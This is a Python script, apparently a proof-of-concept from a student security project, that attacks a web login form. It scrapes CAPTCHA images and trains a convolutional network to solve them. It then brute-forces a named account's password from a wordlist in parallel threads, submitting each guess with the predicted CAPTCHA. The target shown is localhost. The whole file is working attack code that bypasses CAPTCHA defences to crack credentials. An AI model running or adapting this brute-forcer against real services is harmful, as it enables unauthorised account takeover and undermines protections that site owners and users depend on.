print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                        Wavestone POC attack
""")

import threading
import requests
import time
import sys
from label import label
from dl_models import attacker_cnn
from bs4 import BeautifulSoup
from PIL import Image
import numpy as np 
from utils import convert_to_tfds
import matplotlib.pyplot as plt
import tensorflow as tf

class BruteForceCracker:
    def __init__(self, url, username, error_message_password, trained_model):
        self.url = url
        self.username = username
        self.error_message_password = error_message_password
        self.trained_model = trained_model
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password, num_iter=2):
        for i in range(num_iter) : 
            print("--------- {} captcha try -------------".format(i+1))
            current_captcha = retrieve_captcha_images(self.url, number_iter=1)
            tfds_captcha = convert_to_tfds(current_captcha)
            preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
            preds_numpy = preds.numpy()  
            preds_string = ''.join([str(idx) for idx in preds_numpy])
            data_dict = {"email": self.username, "password": password, "captcha_input": preds_string}
            response = requests.post(self.url, data=data_dict)
            if "Welcome" in str(response.content):
                print("Username: ---> " + self.username)
                print("Password: ---> " + password)
                return True
        print("\n")
        return False

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return
    print("No Password Found !")
def retrieve_captcha_images(url, number_iter=300) : 
    img_url = []
    for _ in range(number_iter) : 
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            div_tag = soup.find('div', id='randomImages')
            if div_tag:
                #je récupère ici juste le champ src de la balise (ie l'url de l'image)
                imgs = div_tag.find_all('img')
                #je stocke dans une liste d'url
                for img in imgs : 
                    img_url.append(img.get("src"))
            else:
                print("Div tag not found.")
            
        else:
            print("Failed to retrieve data. Status code:", response.status_code)
    #je parcours la liste d'url, et je récupère l'image que je mets quelque part 
    stock_image = []
    for i in range (len(img_url)):
        img_url[i] = "http://localhost:3006"+img_url[i]
        response = requests.get(img_url[i], stream = True)
        if response.status_code ==200:
            image = Image.open(response.raw)
            pixels = np.array(list(image.getdata())).reshape(28, 28, 1)
            stock_image.append(pixels)

        else : 
            print("error response")
    return stock_image


def main():
    url = "http://localhost:3006/auth/login"
    error = "Password incorrect! Please try again."
    username="mohamed.mekkouri@student-cs.fr"

    ###################### Captcha ##########################
    captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=200)
    tfds_captcha_images = convert_to_tfds(captcha_images)
    predictions = label(tfds_captcha_images)
    attacker_dataset = convert_to_tfds(captcha_images, predictions)
    attacker_model = attacker_cnn.create_model()
    trained_model = attacker_cnn.train(attacker_model, attacker_dataset, epochs=5)
    #########################################################

    cracker = BruteForceCracker(url, username, error, trained_model)
    
    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """ 
                Checking the Server !!        
[+]█████████████████████████████████████████████████[+]
"""
    # print(banner)
    #retrieve_captcha_images("http://localhost:3006/auth/login", 1)
    main()

